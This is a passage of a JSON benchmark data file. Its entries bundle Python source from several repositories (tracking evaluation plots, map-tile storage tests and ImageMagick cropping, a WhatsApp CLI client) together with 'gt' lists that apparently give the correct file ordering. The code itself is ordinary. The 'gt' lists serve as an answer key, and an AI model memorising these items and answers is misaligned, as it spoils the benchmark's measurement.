  legends.append('%s: [%.3f]' %\n                           (name, performance[name][key]['precision_score']))\n        matplotlib.rcParams.update({'font.size': 7.4})\n        legend = ax.legend(lines,\n                           legends,\n                           loc='center left',\n                           bbox_to_anchor=(1, 0.5))\n\n        matplotlib.rcParams.update({'font.size': 9})\n        ax.set(xlabel='Location error threshold',\n               ylabel='Precision',\n               xlim=(0, thr_ce.max()),\n               ylim=(0, 1),\n               title='Precision plots of OPE')\n        ax.grid(True)\n        fig.tight_layout()\n\n        print('Saving precision plots to', prec_file)\n        fig.savefig(prec_file, dpi=300)\n\n'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/dtb70.py'\n:from __future__ import absolute_import\n\nimport os\n\nfrom .otb import ExperimentOTB\nfrom ..datasets import DTB70\n\n\nclass ExperimentDTB70(ExperimentOTB):\n    r\n    def __init__(self, root_dir, result_dir='results', report_dir='reports'):\n        self.dataset = DTB70(root_dir)\n        self.result_dir = os.path.join(result_dir, 'DTB70')\n        self.report_dir = os.path.join(report_dir, 'DTB70')\n\n\n        self.nbins_iou = 21\n        self.nbins_ce = 51\n",
        "gt": [
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/otb.py'",
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/dtb70.py'",
            "'STMTrack/videoanalyst/evaluation/got_benchmark/experiments/__init__.py'",
            "'STMTrack/videoanalyst/engine/tester/tester_impl/lasot.py'"
        ]
    },
    {
        "files": [
            "'mason/tests/test_core_tilestorage.py'",
            "'mason/mason/core/gridcrop.py'",
            "'mason/mason/core/__init__.py'"
        ],
        "content": "'mason/tests/test_core_tilestorage.py'\n:\nimport os, os.path\nimport sys\nimport shutil\nimport time\nimport unittest\nimport warnings\nimport threading\nimport memcache\n\nfrom mason.tilestorage import TileStorageFactory, MBTilesTileStorage\nfrom mason.core import Format, Metadata, Pyramid, Tile, MetaTile\nfrom mason.tilestorage.cluster import TileCluster\n\n\nfactory = TileStorageFactory()\n\n\nBUCKET_NAME = 'masonmaps-tiles'\n\n\nclass TileStorageTestMixin(object):\n\n    def testGetPut(self):\n        tile1 = self.pyramid.create_tile(3, 4, 5, b'tile1')\n        self.storage.put(tile1)\n\n        tileindex1 = self.pyramid.create_tile_index(3, 4, 5)\n        tileindex2 = self.pyramid.create_tile_index(3, 4, 6)\n        self.assertTrue(self.storage.get(tileindex1) is not None)\n        self.assertTrue(self.storage.get(tileindex2) is None)\n\n        tile3 = self.storage.get(tileindex1)\n\n        self.assertTrue(tile3 is not None)\n\n        self.assertEqual(tile1.index, tile3.index)\n        self.assertEqual(tile1.data, tile3.data)\n\n        self.assertTrue(self.storage.has(tileindex1))\n        self.storage.delete(tileindex1)\n        self.assertFalse(self.storage.has(tileindex1))\n\n    def testGetPutMulti(self):\n        tile1 = self.pyramid.create_tile(4, 5, 6, b'tile1')\n        tile2 = self.pyramid.create_tile(4, 5, 7, b'tile2')\n        tile3 = self.pyramid.create_tile(4, 5, 8, b'tile3')\n\n        self.storage.put_multi([tile1, tile2, tile3])\n\n        tileindex1 = self.pyramid.create_tile_index(4, 5, 6)\n        tileindex2 = self.pyramid.create_tile_index(4, 5, 7)\n        tileindex3 = self.pyramid.create_tile_index(4, 5, 9)\n        tileindex4 = self.pyramid.create_tile_index(4, 5, 10)\n\n        tiles1 = self.storage.get_multi([tileindex1, tileindex2])\n\n        self.assertSetEqual(set(tiles1.keys()),\n                            set([tileindex1, tileindex2]))\n        self.assertEqual(tiles1[tileindex1].data, tile1.data)\n        self.assertDictEqual(self.storage.get_multi([tileindex3,\n                                                     tileindex4])\n                             , {})\n\n        tiles2 = self.storage.get_multi([tileindex1, tileindex2,\n                                         tileindex3])\n\n        self.assertSetEqual(set(tiles2.keys()),\n                            set([tileindex1, tileindex2]))\n\n        self.assertTrue(self.storage.has_all([tileindex1, tileindex2]))\n        self.assertFalse(self.storage.has_all([tileindex1, tileindex4]))\n        self.assertTrue(self.storage.has_any([tileindex1, tileindex4]))\n        self.storage.delete_multi([tileindex1, tileindex3, tileindex4])\n        self.assertTrue(self.storage.has_any([tileindex1, tileindex2]))\n        self.assertFalse(self.storage.has_any([tileindex1, tileindex3]))\n\n\nclass TestFileSystemTileStorageDefault(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestFileSystemTileStorageDefault',\n                                               version='1.0.0.0.0.0')\n        self.output_dir = os.path.join('output', 'TestFileSystemTileStorageDefault')\n\n        if os.path.exists(self.output_dir):\n            shutil.rmtree(self.output_dir, ignore_errors=True)\n\n        self.storage = factory('filesystem',\n                               self.pyramid,\n                               self.metadata,\n                               root=self.output_dir,\n                               compress=False,\n                               simple=False,)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n    def testFilename(self):\n        tile1 = self.pyramid.create_tile(0, 0, 0, b'tile1', {})\n        self.storage.put(tile1)\n        self.assertTrue(os.path.exists(os.path.join(self.output_dir,\n                                                    '00',\n                                                    '0-0-0.dat')))\n\n        tile2 = self.pyramid.create_tile(20, 1000, 2000, b'tile2', {})\n        self.storage.put(tile2)\n        self.assertTrue(os.path.exists(os.path.join(self.output_dir,\n                                                    '20',\n                                                    '00', '07', 'C0', '0F',\n                                                    '20-1000-2000.dat')))\n\n\nclass TestFileSystemTileStorageCompressed(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestFileSystemTileStorageCompressed',\n                                               version='1.0.0.0.0.0')\n        self.output_dir = os.path.join('output', 'TestFileSystemTileStorageCompressed')\n\n        if os.path.exists(self.output_dir):\n            shutil.rmtree(self.output_dir, ignore_errors=True)\n\n        self.storage = factory('filesystem',\n                               self.pyramid,\n                               self.metadata,\n                               root=self.output_dir,\n                               compress=True,\n                               simple=False,)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n    def testFilename(self):\n        tile1 = self.pyramid.create_tile(0, 0, 0, b'tile1', {})\n        self.storage.put(tile1)\n        self.assertTrue(os.path.exists(os.path.join(self.output_dir,\n                                                    '00',\n                                                    '0-0-0.dat.gz')))\n\n        tile2 = self.pyramid.create_tile(20, 1000, 2000, b'tile2', {})\n        self.storage.put(tile2)\n        self.assertTrue(os.path.exists(os.path.join(self.output_dir,\n                                                    '20',\n                                                    '00', '07', 'C0', '0F',\n                                                    '20-1000-2000.dat.gz')))\n\n\nclass TestFileSystemTileStorageSimpleCompressed(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestFileSystemTileStorageSimpleCompressed',\n                                               version='1.0.0.0.0.0')\n        self.output_dir = os.path.join('output', 'TestFileSystemTileStorageSimpleCompressed')\n\n        if os.path.exists(self.output_dir):\n            shutil.rmtree(self.output_dir, ignore_errors=True)\n\n        self.storage = factory('filesystem',\n                               self.pyramid,\n                               self.metadata,\n                               root=self.output_dir,\n                               compress=False,\n                               simple=True,)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n\nclass TestMemcachedTileStorage(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestMemcachedTileStorage')\n\n        self.storage = factory('memcache',\n                               self.pyramid,\n                               self.metadata)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n\nclass TestMBTilesTileStorage(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n\n        self.metadata = Metadata.make_metadata(tag='TestMBTilesTileStorage',\n                                               version='1',\n                                               attribution='foo')\n\n        filename = './output/TestMBTilesTileStorage.db'\n        if os.path.exists(filename):\n            os.unlink(filename)\n        self.storage = factory('mbtiles',\n                               self.pyramid,\n                               self.metadata,\n                               database=filename)\n\n    def tearDown(self):\n        tile1 = self.pyramid.create_tile(3, 4, 5, b'tile1')\n        self.storage.put(tile1)\n        storage = MBTilesTileStorage.from_mbtiles('./output/TestMBTilesTileStorage.db')\n        self.assertEqual(storage.metadata.version, self.storage.metadata.version)\n        self.storage.close()\n\n\nclass TestMBTilesTileStorageBackgroundWriter(unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n\n        self.metadata = Metadata.make_metadata(tag='TestMBTilesTileStorageBackgroundWriter',)\n        filename = './output/TestMBTilesTileStorageBackgroundWriter.db'\n        if os.path.exists(filename):\n            os.unlink(filename)\n        self.storage = factory('mbtilesbw',\n                               self.pyramid,\n                               self.metadata,\n                               database=filename)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n    def testGetPut(self):\n        tile1 = self.pyramid.create_tile(3, 4, 5, b'tile1')\n        self.storage.put(tile1)\n        self.storage.sync()\n        tileindex1 = self.pyramid.create_tile_index(3, 4, 5)\n        tileindex2 = self.pyramid.create_tile_index(3, 4, 6)\n        self.assertTrue(self.storage.get(tileindex1) is not None)\n        self.assertTrue(self.storage.get(tileindex2) is None)\n\n        tile3 = self.storage.get(tileindex1)\n\n        self.assertEqual(tile1.index, tile3.index)\n        self.assertEqual(tile1.data, tile3.data)\n\n        self.assertTrue(self.storage.has(tileindex1))\n        self.storage.delete(tileindex1)\n        self.storage.sync()\n        self.assertFalse(self.storage.has(tileindex1))\n\n    def testGetPutMulti(self):\n        tile1 = self.pyramid.create_tile(4, 5, 6, b'tile1')\n        tile2 = self.pyramid.create_tile(4, 5, 7, b'tile2')\n        tile3 = self.pyramid.create_tile(4, 5, 8, b'tile3')\n\n        self.storage.put_multi([tile1, tile2, tile3])\n        self.storage.sync()\n\n        tileindex1 = self.pyramid.create_tile_index(4, 5, 6)\n        tileindex2 = self.pyramid.create_tile_index(4, 5, 7)\n        tileindex3 = self.pyramid.create_tile_index(4, 5, 9)\n        tileindex4 = self.pyramid.create_tile_index(4, 5, 10)\n\n        tiles1 = self.storage.get_multi([tileindex1, tileindex2])\n\n        self.assertSetEqual(set(tiles1.keys()),\n                            set([tileindex1, tileindex2]))\n        self.assertEqual(tiles1[tileindex1].data, tile1.data)\n        self.assertDictEqual(self.storage.get_multi([tileindex3,\n                                                     tileindex4])\n                             , {})\n\n        tiles2 = self.storage.get_multi([tileindex1, tileindex2,\n                                         tileindex3])\n\n        self.assertSetEqual(set(tiles2.keys()),\n                            set([tileindex1, tileindex2]))\n\n        self.assertTrue(self.storage.has_all([tileindex1, tileindex2]))\n        self.assertFalse(self.storage.has_all([tileindex1, tileindex4]))\n        self.assertTrue(self.storage.has_any([tileindex1, tileindex4]))\n        self.storage.delete_multi([tileindex1, tileindex3, tileindex4])\n        self.storage.sync()\n        self.assertTrue(self.storage.has_any([tileindex1, tileindex2]))\n        self.assertFalse(self.storage.has_any([tileindex1, tileindex3]))\n\n\nclass TestCascadeTileStorage(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestCascadeTileStorage')\n        self.output_dir = os.path.join('output', 'TestCascadeTileStorage')\n\n        self.storage = factory('cascade',\n                               self.pyramid,\n                               self.metadata,\n                               violate=['memcache', {'servers': ['localhost:11211', ]}],\n                               presistent=['filesystem', {'root': self.output_dir}],\n                               )\n\n    def tearDown(self):\n        self.storage.close()\n\n\nclass TestS3TileStorage(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='__S3StorageTest')\n        self.storage = factory('s3',\n                               self.pyramid,\n                               self.metadata,\n                               access_key=None,\n                               secret_key=None,\n                               bucket_name=BUCKET_NAME,\n                               simple=False,\n\n                               )\n\n    def tearDown(self):\n        self.storage.close()\n\n\nclass TestMetaTileCache(unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestMetaTileCache',\n                                               version='1.0.0.0.0.0')\n        self.output_dir = os.path.join('output', 'TestMetaTileCache')\n\n        if os.path.exists(self.output_dir):\n            shutil.rmtree(self.output_dir, ignore_errors=True)\n\n        self.storage = factory('metacache',\n                               self.pyramid,\n                               self.metadata,\n                               root=self.output_dir,\n                               )\n\n    def tearDown(self):\n\n        self.storage.close()\n\n    def testGetPut(self):\n        tile1 = self.pyramid.create_metatile(3, 4, 5, 4, b'tile1')\n        self.storage.put(tile1)\n\n        tileindex1 = self.pyramid.create_metatile_index(3, 4, 5, 4)\n        tileindex2 = self.pyramid.create_metatile_index(3, 3, 6, 4)\n        self.assertTrue(self.storage.get(tileindex1) is not None)\n        self.assertTrue(self.storage.get(tileindex2) is None)\n\n        tile3 = self.storage.get(tileindex1)\n\n        self.assertEqual(tile1.index, tile3.index)\n        self.assertEqual(tile1.data, tile3.data)\n\n        self.assertTrue(self.storage.has(tileindex1))\n        self.storage.delete(tileindex1)\n        self.assertFalse(self.storage.has(tileindex1))\n\n\nclass TestTileCluster(unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n\n    def testFusion(self):\n        tiles = [self.pyramid.create_tile(4, 0, 0, b'tile1'),\n                 self.pyramid.create_tile(4, 1, 0, b'tile2'),\n                 self.pyramid.create_tile(4, 0, 1, b'tile2'),\n                 self.pyramid.create_tile(4, 1, 1, b'tile4'), ]\n\n        cluster = TileCluster(self.pyramid, tiles)\n\n        zip_file = cluster.fusion()\n\n        with open(os.path.join('output', 'clustertest1.zip'), 'wb') as fp:\n            fp.write(zip_file)\n\n        tiles_readback = cluster.fission(self.pyramid, zip_file)\n\n        self.assertEqual(set(t.index.coord for t in tiles),\n                         set(t.index.coord for t in tiles_readback))\n\n        self.assertEqual(set(t.data_hash for t in tiles),\n                         set(t.data_hash for t in tiles_readback))\n\n\nclass TestFileClusterStorage(TileStorageTestMixin, unittest.TestCase):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='TestClusterStorage',\n                                               version='1.0.0.0.0.0')\n        self.output_dir = os.path.join('output', 'TestClusterStorage')\n\n        if os.path.exists(self.output_dir):\n            shutil.rmtree(self.output_dir, ignore_errors=True)\n\n        self.storage = factory('cluster',\n                               self.pyramid,\n                               self.metadata,\n                               stride=2,\n                               servers=['localhost:11211'],\n                               timeout=0,\n                               root=self.output_dir,\n                               compress=False,)\n\n    def tearDown(self):\n\n        self.storage.close()\n\n    def testGetPutMulti(self):\n        tiles = [self.pyramid.create_tile(4, 0, 0, b'tile1'),\n                 self.pyramid.create_tile(4, 1, 0, b'tile2'),\n                 self.pyramid.create_tile(4, 0, 1, b'tile3'),\n                 self.pyramid.create_tile(4, 1, 1, b'tile2'), ]\n\n        self.storage.put_multi(tiles)\n\n        tileindex1 = self.pyramid.create_tile_index(4, 0, 1)\n        tileindex2 = self.pyramid.create_tile_index(4, 1, 1)\n\n        tile1 = self.storage.get(tileindex1)\n        self.assertEqual(tile1.data, b'tile3')\n\n        tile2 = self.storage.get(tileindex2)\n        self.assertEqual(tile2.data, b'tile2')\n\n\nclass TestS3ClusterStorage(TestFileClusterStorage):\n\n    def setUp(self):\n        self.pyramid = Pyramid(levels=range(21), format=Format.DATA)\n        self.metadata = Metadata.make_metadata(tag='__S3ClusterStorageTest',\n                                               version='2.0')\n\n        self.storage = factory('s3cluster',\n                               self.pyramid,\n                               self.metadata,\n                               stride=2,\n                               servers=['localhost:11211'],\n                               timeout=0,\n                               access_key=None,\n                               secret_key=None,\n                               bucket_name=BUCKET_NAME,\n                               compress=True,\n                               )\n\n\nif __name__ == \"__main__\":\n\n    unittest.main()\n\n'mason/mason/core/gridcrop.py'\n:\n\nimport io\nimport subprocess\n\nfrom .format import Format\nfrom .tile import Tile, MetaTile\n\n\n\n\n\ntry:\n    from PIL import Image\n    if Image.VERSION != '1.1.7':\n        raise ImportError('Excepted PIL 1.1.7')\nexcept ImportError:\n    HAS_PIL = False\nelse:\n    HAS_PIL = True\n\n\ndef check_imagemagick():\n\n    try:\n        output = subprocess.check_output(['convert', '-version'])\n    except Exception as e:\n        raise ImportError('Requires imagemagick to crop images (convert).\\n%r' % e)\n    import re\n    match = re.search(r'Version: ImageMagick (\\d+\\.\\d+)\\.(\\d+)-(\\d+)', output)\n    if not match:\n        raise ImportError(\"Don't understand 'convert -version' output \")\n\n    version = float(match.group(1)) + float(match.group(2)) * 0.01\n    if version < 6.5:\n\n        raise ImportError('Requires ImageMagick 6.6.9 or higher')\n\ntry:\n    check_imagemagick()\nexcept Exception:\n    HAS_IMAGEMAGICK = False\nelse:\n    HAS_IMAGEMAGICK = True\n\nif not (HAS_PIL or HAS_IMAGEMAGICK):\n    raise ImportError('Requires ImageMagick or PIL but got nothing')\n\n\n\n\n\n\nclass _BytesIO(io.BytesIO):\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n    def fileno(self):\n        raise AttributeError\n\n\ndef buffer_crop_pil(image_data, size, buffer, format):\n    im = Image.open(_BytesIO(image_data))\n    width, height = size, size\n    crop_box = [buffer, buffer, size - buffer, size - buffer]\n    left, top, right, bottom = crop_box\n    assert (left < width and left < right and left > 0)\n    assert (top < height and top < bottom and top > 0)\n    rgn = im.crop(crop_box)\n    buf = _BytesIO()\n    if format == Format.JPG:\n        rgn.save(buf, 'jpeg', quality=90, optimize=True)\n    elif format == Format.PNG:\n        rgn.save(buf, 'png', optimize=True)\n    else:\n        raise 'Unsupported format %r' % format\n    return buf.getvalue()\n\n\ndef grid_crop_pil(image_data, stride, size, buffer, format):\n    big_image = Image.open(_BytesIO(image_data))\n    width, height = size, size\n    rows, columns = stride, stride\n    grid_width = grid_height = size // stride\n\n    cropped = dict()\n    for row in range(0, rows):\n        for column in range(0, columns):\n            left = row * grid_width + buffer\n            top = column * grid_height + buffer\n            right = left + grid_width\n            bottom = top + grid_height\n\n            crop_box = (left, top, right, bottom)\n            grid_image = big_image.crop(crop_box)\n            buf = _BytesIO()\n\n            if format == Format.JPG:\n                grid_image.save(buf, 'jpeg', quality=90, optimize=True)\n            elif format == Format.PNG:\n                grid_image.save(buf, 'png', optimize=True)\n            else:\n                raise 'Unsupported format %r' % format\n            cropped[(row, column)] = buf.getvalue()\n    return cropped\n\n\n\n\n\n\n\nMAGIC_NUMBER = dict(PNG=b'\\x89PNG\\r\\n\\x1a\\n',\n                    PNG256=b'\\x89PNG\\r\\n\\x1a\\n',\n                    JPG=b'\\xff\\xd8',\n                    TIFF=b'II*\\x00',)\n\n\ndef convert(input_data, command, input_format, output_format=None):\n\n\n\n    input_extension = input_format.extension[1:]\n    if output_format is None:\n        output_extension = input_extension\n    else:\n        output_extension = output_format.extension[1:]\n\n    args = ['convert',\n            '-quiet', '-limit', 'thread', '1',\n            '%s:-' % input_extension, ]\n\n    if input_format == output_format == Format.JPG:\n\n        command.extend(['-define', 'jpeg:preserve-settings', ])\n\n    args.extend(command)\n    args.extend(['%s:-' % output_extension, ])\n\n    popen = subprocess.Popen(args, stdin=subprocess.PIPE,\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE)\n    output_data, stderr = popen.communicate(input_data)\n    retcode = popen.poll()\n\n    if retcode != 0:\n        raise subprocess.CalledProcessError(retcode, args, stderr)\n\n    return output_data\n\n\ndef buffer_crop_imagemagick(image_data, size, buffer, format):\n    command = ['-shave', '%dx%d' % (buffer, buffer), ]\n    return convert(image_data, command, format)\n\n\ndef grid_crop_imagemagick(image_data, stride, size, buffer, format):\n\n    width = height = size\n    left, top, right, bottom = buffer, buffer, width - buffer, height - buffer\n\n    command = [\n            '-shave', '%dx%d' % (buffer, buffer),\n            '-crop', '%dx%d@' % (stride, stride),\n            '+repage', '+adjoin',\n            ]\n\n    image_stream = convert(image_data, command, format)\n\n\n\n    magic = MAGIC_NUMBER[format.name]\n\n    bodies = image_stream.split(magic)\n    assert len(bodies) == stride * stride + 1\n\n    cropped = dict()\n\n    for n, body in enumerate(bodies[1:]):\n        column = n // stride\n        row = n % stride\n\n        data = b''.join([magic, body])\n\n        cropped[(row, column)] = data\n\n    return cropped\n\n\n\n\n\n\ndef buffer_crop(image_data, size, buffer, format):\n    if buffer == 0:\n        return image_data\n    if HAS_PIL and format in [Format.JPG, Format.PNG]:\n        return buffer_crop_pil(image_data, size, buffer, format)\n    else:\n        return buffer_crop_imagemagick(image_data, size, buffer, format)\n\n\ndef grid_crop(image_data, stride, size, buffer, format):\n    if HAS_PIL and format in [Format.JPG, Format.PNG]:\n        return grid_crop_pil(image_data, stride, size, buffer, format)\n    else:\n        return grid_crop_imagemagick(image_data, stride, size, buffer, format)\n\n\ndef metatile_fission(metatile):\n\n    format = metatile.format\n\n\n    assert format in [Format.PNG256, Format.PNG, Format.JPG, Format.TIFF]\n    stride = metatile.index.stride\n    size = metatile.index.tile_size\n    buffer = metatile.index.buffer\n\n    tile_indexes = metatile.index.fission()\n    if buffer == 0 and stride == 1:\n    \treturn [Tile.from_tile_index(tile_indexes[0],\n                                     metatile.data,\n                                     fmt=format,\n                                     mtime=metatile.mtime)]\n\n    cropped = grid_crop(metatile.data, stride, size, buffer, format)\n    tiles = list()\n\n    for tile_index in tile_indexes:\n        x = tile_index.x - metatile.index.x\n        y = tile_index.y - metatile.index.y\n        data = cropped[(x, y)]\n        tile = Tile.from_tile_index(tile_index,\n                                    data,\n                                    fmt=format,\n                                    mtime=metatile.mtime)\n        tiles.append(tile)\n\n    return tiles\n\n\n'mason/mason/core/__init__.py'\n:\n\nfrom .geo import (Coordinate, Point, Envelope, create_projection,\n                  tile_coordinate_to_serial, tile_coordiante_to_dirname,\n                  )\nfrom .tile import Tile, TileIndex, MetaTile, MetaTileIndex\nfrom .pyramid import Pyramid\nfrom .format import Format\nfrom .gridcrop import metatile_fission, grid_crop, buffer_crop\nfrom .metadata import Metadata\nfrom .walker import PyramidWalker, TileListPyramidWalker\n",
        "gt": [
            "'mason/mason/core/gridcrop.py'",
            "'mason/mason/core/__init__.py'",
            "'mason/tests/test_core_tilestorage.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/layers/protocol_chatstate/protocolentities/chatstate_incoming.py'",
            "'yowsup/yowsup/layers/protocol_chatstate/protocolentities/__init__.py'",
            "'yowsup/yowsup/demos/cli/__init__.py'",
            "'yowsup/yowsup/demos/cli/stack.py'",
            "'yowsup/yowsup/demos/cli/layer.py'"
        ],
        "content": "'yowsup/yowsup/layers/protocol_chatstate/protocolentities/chatstate_incoming.py'\n:from .chatstate import ChatstateProtocolEntity\nclass IncomingChatstateProtocolEntity(ChatstateProtocolEntity):\n\n\n    def __init__(self, _state, _from):\n        super(IncomingChatstateProtocolEntity, self).__init__(_state)\n        self.setIncomingData(_from)\n\n    def setIncomingData(self, _from):\n        self._from = _from\n\n    def toProtocolTreeNode(self):\n        node = super(IncomingChatstateProtocolEntity, self).toProtocolTreeNode()\n        node.setAttribute(\"from\", self._from)\n        return node\n\n    def __str__(self):\n        out  = super(IncomingChatstateProtocolEntity, self).__str__()\n        out += \"From: %s\\n\" % self._from\n        return out\n\n    @staticmethod\n    def fromProtocolTreeNode(node):\n        entity = ChatstateProtocolEntity.fromProtocolTreeNode(node)\n        entity.__class__ = IncomingChatstateProtocolEntity\n        entity.setIncomingData(\n            node.getAttributeValue(\"from\"),\n        )\n        return entity\n\n'yowsup/yowsup/layers/protocol_chatstate/protocolentities/__init__.py'\n:from .chatstate import ChatstateProtocolEntity\nfrom .chatstate_incoming import IncomingChatstateProtocolEntity\nfrom .chatstate_outgoing import OutgoingChatstateProtocolEntity\n\n'yowsup/yowsup/demos/cli/__init__.py'\n:from .stack import YowsupCliStack\n\n'yowsup/yowsup/demos/cli/stack.py'\n:from yowsup.stacks import  YowStackBuilder\nfrom .layer import YowsupCliLayer\nfrom yowsup.layers import YowLayerEvent\nfrom yowsup.layers.axolotl.props import PROP_IDENTITY_AUTOTRUST\nimport sys\n\n\nclass YowsupCliStack(object):\n    def __init__(self, profile):\n        stackBuilder = YowStackBuilder()\n\n        self._stack = stackBuilder\\\n            .pushDefaultLayers()\\\n            .push(YowsupCliLayer)\\\n            .build()\n\n        self._stack.setProfile(profile)\n        self._stack.setProp(PROP_IDENTITY_AUTOTRUST, True)\n\n    def set_prop(self, prop, val):\n        self._stack.setProp(prop, val)\n\n    def start(self):\n        print(\"Yowsup Cli client\\n==================\\nType /help for available commands\\n\")\n        self._stack.broadcastEvent(YowLayerEvent(YowsupCliLayer.EVENT_START))\n\n        try:\n            self._stack.loop()\n        except KeyboardInterrupt:\n            print(\"\\nYowsdown\")\n            sys.exit(0)\n\n'yowsup/yowsup/demos/cli/layer.py'\n:from .cli import Cli, clicmd\nfrom yowsup.layers.interface import YowInterfaceLayer, ProtocolEntityCallback\nfrom yowsup.layers import YowLayerEvent, EventCallback\nfrom yowsup.layers.network import YowNetworkLayer\nimport sys\nfrom yowsup.common import YowConstants\nimport datetime\nimport time\nimport os\nimport logging\nimport threading\nimport base64\nfrom yowsup.layers.protocol_groups.protocolentities      import *\nfrom yowsup.layers.protocol_presence.protocolentities    import *\nfrom yowsup.layers.protocol_messages.protocolentities    import *\nfrom yowsup.layers.protocol_ib.protocolentities          import *\nfrom yowsup.layers.protocol_iq.protocolentities          import *\nfrom yowsup.layers.protocol_contacts.protocolentities    import *\nfrom yowsup.layers.protocol_chatstate.protocolentities   import *\nfrom yowsup.layers.protocol_privacy.protocolentities     import *\nfrom yowsup.layers.protocol_media.protocolentities       import *\nfrom yowsup.layers.protocol_media.mediauploader import MediaUploader\nfrom yowsup.layers.protocol_profiles.protocolentities    import *\nfrom yowsup.common.tools import Jid\nfrom yowsup.common.optionalmodules import PILOptionalModule\nfrom yowsup.layers.axolotl.protocolentities.iq_key_get import GetKeysIqProtocolEntity\n\nlogger = logging.getLogger(__name__)\nclass YowsupCliLayer(Cli, YowInterfaceLayer):\n    PROP_RECEIPT_AUTO       = \"org.openwhatsapp.yowsup.prop.cli.autoreceipt\"\n    PROP_RECEIPT_KEEPALIVE  = \"org.openwhatsapp.yowsup.prop.cli.keepalive\"\n    PROP_CONTACT_JID        = \"org.openwhatsapp.yowsup.prop.cli.contact.jid\"\n    EVENT_LOGIN             = \"org.openwhatsapp.yowsup.event.cli.login\"\n    EVENT_START             = \"org.openwhatsapp.yowsup.event.cli.start\"\n    EVENT_SENDANDEXIT       = \"org.openwhatsapp.yowsup.event.cli.sendandexit\"\n\n    MESSAGE_FORMAT          = \"[%s(%s)]:[%s]\\t %s\"\n\n    FAIL_OPT_PILLOW         = \"No PIL library installed, try install pillow\"\n    FAIL_OPT_AXOLOTL        = \"axolotl is not installed, try install python-axolotl\"\n\n    DISCONNECT_ACTION_PROMPT = 0\n    DISCONNECT_ACTION_EXIT   = 1\n\n    ACCOUNT_DEL_WARNINGS = 4\n\n    def __init__(self):\n        super(YowsupCliLayer, self).__init__()\n        YowInterfaceLayer.__init__(self)\n        self.accountDelWarnings = 0\n        self.connected = False\n        self.username = None\n        self.sendReceipts = True\n        self.sendRead = True\n        self.disconnectAction = self.__class__.DISCONNECT_ACTION_PROMPT\n\n\n\n\n        self.jidAliases = {\n\n        }\n\n    def aliasToJid(self, calias):\n        for alias, ajid in self.jidAliases.items():\n            if calias.lower() == alias.lower():\n                return Jid.normalize(ajid)\n\n        return Jid.normalize(calias)\n\n    def jidToAlias(self, jid):\n        for alias, ajid in self.jidAliases.items():\n            if ajid == jid:\n                return alias\n        return jid\n\n    @EventCallback(EVENT_START)\n    def onStart(self, layerEvent):\n        self.startInput()\n        return True\n\n    @EventCallback(YowNetworkLayer.EVENT_STATE_DISCONNECTED)\n    def onStateDisconnected(self,layerEvent):\n        self.output(\"Disconnected: %s\" % layerEvent.getArg(\"reason\"))\n        if self.disconnectAction == self.__class__.DISCONNECT_ACTION_PROMPT:\n           self.connected = False\n           self.notifyInputThread()\n        else:\n           os._exit(os.EX_OK)\n\n    def assertConnected(self):\n        if self.connected:\n            return True\n        else:\n            self.output(\"Not connected\", tag = \"Error\", prompt = False)\n            return False\n\n\n    @clicmd(\"Set presence name\")\n    def presence_name(self, name):\n        if self.assertConnected():\n            entity = PresenceProtocolEntity(name = name)\n            self.toLower(entity)\n\n    @clicmd(\"Set presence as available\")\n    def presence_available(self):\n        if self.assertConnected():\n            entity = AvailablePresenceProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Set presence as unavailable\")\n    def presence_unavailable(self):\n        if self.assertConnected():\n            entity = UnavailablePresenceProtocolEntity()\n            self.toLower(entity)\n\n    @clicmd(\"Unsubscribe from contact's presence updates\")\n    def presence_unsubscribe(self, contact):\n        if self.assertConnected():\n            entity = UnsubscribePresenceProtocolEntity(self.aliasToJid(contact))\n            self.toLower(entity)\n\n    @clicmd(\"Subscribe to contact's presence updates\")\n    def presence_subscribe(self, contact):\n        if self.assertConnected():\n            entity = SubscribePresenceProtocolEntity(self.aliasToJid(contact))\n            self.toLower(entity)\n\n\n\n\n    @clicmd(\"Send clean dirty\")\n    def ib_clean(self, dirtyType):\n        if self.assertConnected():\n            entity = CleanIqProtocolEntity(\"groups\", YowConstants.DOMAIN)\n            self.toLower(entity)\n\n    @clicmd(\"Ping server\")\n    def ping(self):\n        if self.assertConnected():\n            entity = PingIqProtocolEntity(to = YowConstants.DOMAIN)\n            self.toLower(entity)\n\n\n\n\n    @clicmd(\"Set status text\")\n    def profile_setStatus(self, text):\n        if self.assertConnected():\n\n            def onSuccess(resultIqEntity, 